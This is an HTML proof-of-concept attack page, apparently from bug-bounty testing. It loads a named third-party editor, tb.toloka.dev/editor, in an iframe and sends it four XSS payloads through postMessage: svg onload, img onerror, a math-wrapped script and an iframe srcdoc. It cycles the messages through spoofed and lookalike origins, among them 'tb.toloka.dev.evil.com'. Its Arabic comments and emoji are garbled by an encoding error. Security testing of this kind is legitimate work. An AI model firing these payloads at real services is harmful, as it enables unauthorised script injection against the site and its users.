<!DOCTYPE html>
<html>
<head>
  <title>SSRF + XSS via postMessage Attack</title>
</head>
<body>
  <h2>ðŸš¨ XSS Test via postMessage Ø¥Ù„Ù‰ iframe Toloka Builder</h2>

  <iframe id="victim" src="https://tb.toloka.dev/editor" style="width: 90%; height: 600px; border: 2px solid red;"></iframe>

  <script>
    const iframe = document.getElementById("victim");

    const payloads = [
      `<svg onload=alert('XSS_SVG_BYPASS')>`, // Bypass 1: SVG tag
      `<img src=x onerror=alert('XSS_IMG')>`, // Bypass 2: onerror
      `<math><script>alert('XSS_MATH')</script></math>`, // Bypass 3: Math tag
      `<iframe srcdoc="<script>alert('XSS_IFRAME')</script>">` // Bypass 4: iframe.srcdoc
    ];

    const originsToTry = [
      "https://tb.toloka.dev",              // Ø§Ù„Ø±Ø³Ù…ÙŠ
      "https://x.tb.toloka.dev",           // Ù†Ø·Ø§Ù‚ ÙØ±Ø¹ÙŠ
      "https://tb-toloka.dev",             // Ù…Ø´Ø§Ø¨Ù‡
      "https://evil.toloka.dev",           // Ù…ØªØºÙŠØ±
      "https://tb.toloka.dev.evil.com",    // Ø®Ø¯Ø§Ø¹
    ];

    window.onload = () => {
      setTimeout(() => {
        originsToTry.forEach((origin) => {
          payloads.forEach((xss) => {
            const craftedMessage = {
              originalEvent: {
                origin: origin
              },
              data: xss
            };

            console.log(`[ðŸ“¤] Sending to iframe... origin: ${origin} | payload: ${xss}`);
            iframe.contentWindow.postMessage(craftedMessage, origin);
          });
        });
      }, 2000); // Ù†Ù†ØªØ¸Ø± ØªØ­Ù…ÙŠÙ„ iframe
    };
  </script>
</body>
</html>
